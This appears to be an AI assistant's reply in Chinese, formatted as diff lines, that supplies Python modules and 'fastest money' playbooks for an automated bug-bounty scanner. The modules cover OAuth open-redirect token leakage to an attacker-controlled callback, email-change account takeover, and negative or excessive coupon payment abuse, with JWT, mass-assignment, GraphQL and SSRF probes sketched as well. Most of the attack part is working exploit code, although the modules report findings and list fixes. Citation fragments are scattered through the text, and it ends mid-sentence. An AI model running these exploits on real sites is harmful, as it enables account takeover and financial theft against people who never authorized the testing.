+為什麼能出錢：許多 IdP / OAuth 實作沒綁死 redirect_uri 或接受「二跳 Open-Redirect」→ 直接把 code/token 丟到攻擊者域，典型高嚴重度。
+PortSwigger
++2
+Medium
++2
+
+路徑：/oauth/authorize?client_id=...&redirect_uri=https://target.com/redirect?next=//evil.tld/cb
+若 302 的 Location 指到你控制的 CB，就能證明洩漏風險（再配合 state/PKCE 弱化檢測）。
+PortSwigger
+
+services/features/oauth_openredir_chain/worker.py（節選）
+
+@FeatureRegistry.register
+class OAuthOpenRedirectChain(FeatureBase):
+    name = "oauth_openredir_chain"; version = "1.0.0"; tags = ["oauth","open-redirect","token-leak"]
+    def run(self, p):
+        http = SafeHttp()
+        base = p["target"]; auth = urljoin(base, p.get("auth_endpoint","/oauth/authorize"))
+        client = p["client_id"]; cb = p["attacker_cb"]   # 你控的回呼
+        chain = p.get("chain_param","next")              # 常見 next/redirect/returnUrl
+        q = {"response_type":"code","client_id":client,
+             "redirect_uri": f"https://{p['victim_host']}/redir?{chain}={cb}",
+             "state":"x"}                                # 無 PKCE 先探測
+        url = f"{auth}?{urlencode(q)}"
+        r = http.request("GET", url, allow_redirects=False)
+        ok = (300 <= r.status_code < 400 and r.headers.get("Location","").startswith(cb))
+        finding = []
+        if ok:
+            finding.append(Finding(
+              vuln_type="OAuth redirect_uri weak validation via open-redirect chain",
+              severity="high",
+              title="Authorization code/token 可被二跳 Open-Redirect 攔截",
+              evidence={"auth_url": url, "location": r.headers.get("Location")},
+              reproduction=[{"request":{"GET": url},
+                             "expect":"IdP 應拒絕帶外部二跳參數的 redirect_uri"}],
+              impact="可攔截 code/token 進而 ATO（帳戶接管）",
+              recommendation="redirect_uri 嚴格精確比對；拒絕任何可二跳的參數與 //schema"}
+            ))
+        return FeatureResult(bool(finding), self.name,
+            self.build_command_record("oauth.openredir.chain","Probe open-redirect chain",
+                                      {"auth":auth,"client_id":client}), finding, {"location":r.headers.get("Location")})
+
+
+來源佐證：OAuth 常見風險包含 open redirect/redirect URI 操控、缺少 PKCE/state 等，均可導致 code/token 洩漏與 ATO。
+PortSwigger
++1
+
+B. Email 變更流程繞過（弱驗證 → 接管帳號）
+
+為什麼能出錢：業務邏輯類 BAC/IDOR 長年高價，email 變更若沒有嚴格 OTP/舊信箱確認，僅靠弱 token 或可重放，就能把帳戶主信箱換成攻擊者→ 直接 ATO。HackerOne 官方也把這些歸在 Broken Access Control/IDOR 常見高價族群。
+HackerOne
+
+services/features/email_change_bypass/worker.py（節選）
+
+@FeatureRegistry.register
+class EmailChangeBypass(FeatureBase):
+    name="email_change_bypass"; version="1.0.0"; tags=["logic","bac","ato"]
+    def run(self, p):
+        http=SafeHttp(); base=p["target"]; start=urljoin(base,p["start_path"])  # e.g., /api/user/change_email
+        headers=p.get("headers",{}); attacker_mail=p["attacker_mail"]
+        # 1) 申請變更（觀察返回 token / flowId / 沒有舊信箱驗證）
+        r0=http.request("POST", start, headers=headers, json={"new_email": attacker_mail})
+        # 2) 嘗試直接確認（若有 /confirm?token=xxx 但未綁舊信箱/OTP）
+        confirm_path=p.get("confirm_path","/api/user/change_email/confirm")
+        token=(r0.json() if r0.headers.get("Content-Type","").startswith("application/json") else {}).get("token")
+        finding=[]
+        if token:
+            r1=http.request("POST", urljoin(base,confirm_path), headers=headers, json={"token": token})
+            # 3) 讀取個資核對是否已更換（/api/me）
+            r2=http.request("GET", urljoin(base,p.get("check_endpoint","/api/me")), headers=headers)
+            changed=("application/json" in r2.headers.get("Content-Type","") and r2.json().get("email")==attacker_mail)
+            if changed:
+                finding.append(Finding(
+                    vuln_type="Email change flow bypass",
+                    severity="high",
+                    title="可未經舊信箱驗證直接變更主信箱",
+                    evidence={"apply_resp":r0.status_code,"confirm_resp":r1.status_code,"me":r2.json()},
+                    reproduction=[{"request":{"POST":start,"json":{"new_email":attacker_mail}}},
+                                  {"request":{"POST":urljoin(base,confirm_path),"json":{"token": token}}},
+                                  {"request":{"GET":urljoin(base,"/api/me")}}],
+                    impact="可將帳號綁定信箱改為攻擊者 → 完整接管",
+                    recommendation="雙向驗證：必須同時驗證舊信箱與新信箱；token 單次有效、綁裝置/時效/風險分數"}
+                ))
+        return FeatureResult(bool(finding), self.name,
+            self.build_command_record("user.email.change.bypass","Try email-change flow bypass",
+                                      {"start":start,"confirm":confirm_path}),
+            finding, {"apply_status":r0.status_code})
+
+C. 支付/優惠邏輯繞過（超額折抵/重放/任意金額）
+
+為什麼能出錢：Payment/優恵代碼、錢包點數、訂閱等路徑，只要打出負值/超額折抵/重放成功，極易判定高嚴重度（直接金錢損失）。平台上這類案例多半拿高額 BAC 報酬。
+WebAsha
+
+services/features/payment_logic_bypass/worker.py（節選）
+
+@FeatureRegistry.register
+class PaymentLogicBypass(FeatureBase):
+    name="payment_logic_bypass"; version="1.0.0"; tags=["logic","payment","bac"]
+    def run(self,p):
+        http=SafeHttp(); base=p["target"]; apply=urljoin(base,p.get("apply_coupon","/api/cart/apply_coupon"))
+        hdr=p.get("headers",{})
+        # 試探：重放/負值/超額折抵
+        probes=[{"coupon":"WELCOME10","amount":-999},{"coupon":"WELCOME10","amount": 999999}]
+        f=[]; trace=[]
+        for body in probes:
+            r=http.request("POST", apply, headers={**hdr,"Content-Type":"application/json"}, json=body)
+            trace.append({"req":body,"status":r.status_code,"len":len(r.text)})
+            if r.status_code==200 and any(k in (r.text.lower()) for k in ["total:-","credit","balance:-"]):
+                f.append(Finding(
+                  vuln_type="Payment logic abuse",
+                  severity="critical",
+                  title="可用負值/超額折抵竄改支付金額",
+                  evidence={"request":body,"resp_snippet":(r.text or "")[:400]},
+                  reproduction=[{"request":{"POST":apply,"json":body},"expect":"伺服器應拒絕負值/超額折抵/重放"}],
+                  impact="直接金錢損失/套利",
+                  recommendation="後端強制金額下限/上限與整體結算校驗；coupon 使用次數/重放防護；伺服器端最終計價"}
+                ))
+                break
+        cmd=self.build_command_record("payment.logic.bypass","Probe dangerous coupon/amount logic",{"endpoint":apply})
+        return FeatureResult(bool(f), self.name, cmd, f, {"trace":trace})
+
+對前 5 條高 ROI 模組的 v2.5 強化（要點）
+
+Mass-Assignment：加入欄位矩陣與前後快照 diff，證據拉滿；官方與多家實戰均證明一旦升權屬 Critical。
+myF5
++2
+OWASP Foundation
++2
+
+JWT 混淆（alg/kid/RS↔HS）：每次偽造都做雙端點對照（帶/不帶 Authorization），用 200/401/403 壓實影響；參考 PortSwigger 實驗流。
+PortSwigger
++3
+PortSwigger
++3
+PortSwigger
++3
+
+OAuth/OIDC：把 Open-Redirect 反射與 PKCE 降級做成兩條清晰證據線；對齊 WebSec Academy 的漏洞類型。
+PortSwigger
+
+GraphQL 權限：支援admin vs user精確對比；無 admin 時用敏感關鍵詞 + 結構長度啟發（降誤報）；Introspection 檢查作為輔助。
+
+SSRF-OOB（PDF/URL 抓取）：預設 HTTP/S，內網協定預設禁；提供候選 PDF 路徑嘗試；OOB 證據寫入 evidence.ts 與 token 提示；參考近年的 PDF-SSRF write-ups 與總結。
+Intigriti
++2
+blog.cyberadvisors.com
++2
+
+連結 Orchestrator（範例薄層，保證能跑）
+
+services/features/feature_step_executor.py
+
+from services.features.base.feature_registry import FeatureRegistry
+from services.features.base.result_schema import FeatureResult
+
+class FeatureStepExecutor:
+    """
+    把 AttackStep(tool_type='feature', tool_name, params) → FeatureBase.run()。
+    把結果回寫 Trace / 經驗庫 / 即時面板（交由呼叫端注入回調）。
+    """
+    def __init__(self, on_trace=None, on_experience=None, on_emit=None):
+        self.on_trace = on_trace or (lambda _ : None)
+        self.on_exp   = on_experience or (lambda _ : None)
+        self.on_emit  = on_emit or (lambda _ : None)
+
+    def execute(self, step) -> dict:
+        # step: {"tool_type":"feature","tool_name":"mass_assign","params":{...}}
+        if step.get("tool_type") != "feature":
+            return {"ok": False, "error": "not a feature step"}
+        cls = FeatureRegistry.get(step["tool_name"])
+        res: FeatureResult = cls().run(step.get("params", {}))
+        d = res.to_dict()
+        self.on_trace({"feature_result": d})
+        if d.get("findings"):
+            self.on_exp({"type":"feature_finding","payload":d})
+        self.on_emit(d.get("command_record"))
+        return {"ok": True, "result": d}
+
+
+這段讓你的 PlanExecutor 只要遇到 tool_type='feature' 就能直接跑，回寫 trace、經驗庫、面板 CLI JSON 都接好。
+
+最快見錢的操作劇本（以你現在現場可做為準）
+
+路線 A（帳號/權限）
+
+mass_assign：指定可更新自身檔案的 API（/api/profile/update），baseline_body + check_endpoint + check_key=role。
+
+graphql_authz：找 user/profile/order 類型，測 id 為他人，對比 admin/user（若有）。
+
+jwt_confuse：餵測試環低權限 token + validate_endpoint=/api/me，跑 alg=none / kid 路徑 / RS→HS。
+→ 有命中任一，P1/P0 候選；報告直接貼 findings[*] 內容與 reproduction 步驟。
+PortSwigger
++1
+
+路線 B（登入/授權）
+
+oauth_openredir_chain：帶上你控的 attacker_cb，看 302 是否直出第三方；
+
+oauth_probe：測 redirect_uri 精確匹配與 PKCE 強制；
+
+ssrf_oob：在 URL 抓取/PDF 生成點丟 OOB，觀察回呼。
+→ 這條線證據明確、複現容易，Triage 好過。
+PortSwigger
++2
+cobalt.io
++2
+
+路線 C（支付/套利）
+
+payment_logic_bypass：對折抵/優惠/餘額 API 嘗試「負值/超額/重放」；
+
+email_change_bypass：把主信箱換成你控信箱看是否缺舊信箱驗證；
+
+若站上 GraphQL → 回到欄位級驗證做收尾。
+→ 涉及金流/資產變更，通常 High / Critical。
+WebAsha
+
+你要的關鍵：為什麼這些真的「有錢」
+
+平台趨勢：BAC/IDOR、OAuth 錯配、JWT 混淆、SSRF-OOB、Mass-Assignment 近年持續出現，且高嚴重度的單價上升；低嚴重度普遍被壓價。
+HackerOne
++1
+
+教材與實驗：PortSwigger 的 JWT/OAuth 實驗室與講解提供了清晰可複現的攻擊鏈與驗證方法——我們的模組正是把這些機器化，讓證據一次到位。
+PortSwigger
++2
+PortSwigger
++2
+
+近年案例：PDF 生成 SSRF 的 write-ups 一直在出（Intigriti 2025、2024 案例），且容易拿到明確 OOB 證據；Mass-Assignment 的升權案例仍然常見。
+shockwave.cloud
++3
+Intigriti
++3
+blog.cyberadvisors.com
++3
+
+交付方式小結
+
+把上面的 3 個新模組 檔案加入 services/features/.../worker.py；
+
+把 FeatureStepExecutor 加到你的 Orchestrator；
+
+你的面板直接讀 command_record（已含 command/description/parameters/tags/feature_version），報告端貼 findings[*] 即可。
+
+所有請求都受 ALLOWLIST_DOMAINS 管控，避免越界。
+
+如果你要，我可以把**完整檔案（含前 5 + 新 3）**依你的目錄打包成一個「features_v2.5」補包目錄結構貼出來；或者下一步直接幫你把三條「攻擊劇本」轉成可
